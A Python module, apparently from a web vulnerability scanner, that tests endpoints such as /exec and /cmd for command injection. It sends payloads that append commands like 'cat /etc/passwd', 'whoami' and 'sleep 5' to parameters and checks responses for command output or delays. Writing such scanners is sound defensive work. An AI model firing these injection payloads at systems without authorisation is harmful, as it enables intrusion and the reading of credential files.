"""
Command Injection vulnerability testing for the Dynamic Analysis Agent.
"""

import requests
import subprocess
import time
from urllib.parse import urljoin

def test_command_injection(base_url):
    """
    Test for command injection vulnerabilities.

    Args:
        base_url (str): Base URL to test

    Returns:
        list: List of detected vulnerabilities
    """
    vulnerabilities = []

    cmd_payloads = [
        "; ls -la",
        "| ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "; ping -c 1 127.0.0.1",
        "; sleep 5",
        "| sleep 5"
    ]

    test_endpoints = [
        urljoin(base_url, "/exec"),
        urljoin(base_url, "/run"),
        urljoin(base_url, "/cmd"),
        urljoin(base_url, "/system"),
        urljoin(base_url, "/api/exec")
    ]

    for endpoint in test_endpoints:
        for payload in cmd_payloads:
            try:
                params = {"cmd": payload, "command": payload, "exec": payload}
                response = requests.get(endpoint, params=params, timeout=10)

                # Check for command execution indicators
                response_text = response.text.lower()
                command_indicators = [
                    "root", "www-data", "nobody", "daemon",  # Common system users
                    "total ", "drwxr", "lrwxr", "-rw-r",  # File listing patterns
                    "usage: ", "command not found",  # Command help/error patterns
                    "version ", "copyright",  # Version info patterns
                ]

                # Check if any command output indicators are present
                if any(indicator in response_text for indicator in command_indicators):
                    vulnerabilities.append({
                        "type": "Command Injection",
                        "endpoint": endpoint,
                        "payload": payload,
                        "method": "GET",
                        "evidence": "Command execution output detected"
                    })

                # Check for timing attacks (sleep command)
                if response.elapsed.total_seconds() > 4:
                    vulnerabilities.append({
                        "type": "Command Injection",
                        "endpoint": endpoint,
                        "payload": payload,
                        "method": "GET",
                        "evidence": "Timing delay detected"
                    })

                # Additional check: if output contains specific command result patterns
                # Only flag if we see actual system command indicators
                command_output_patterns = [
                    "/bin/", "/usr/", "/etc/", "/home/", "/root/",
                    "uid=", "gid=", "groups=", "shell=",
                    "linux", "gnu", "bash", "sh", "zsh"
                ]

                if len(response_text) > 0 and any(pattern in response_text for pattern in command_output_patterns):
                    # Response contains system command output patterns
                    vulnerabilities.append({
                        "type": "Command Injection",
                        "endpoint": endpoint,
                        "payload": payload,
                        "method": "GET",
                        "evidence": "System command output detected"
                    })

            except requests.RequestException:
                continue

    return vulnerabilities
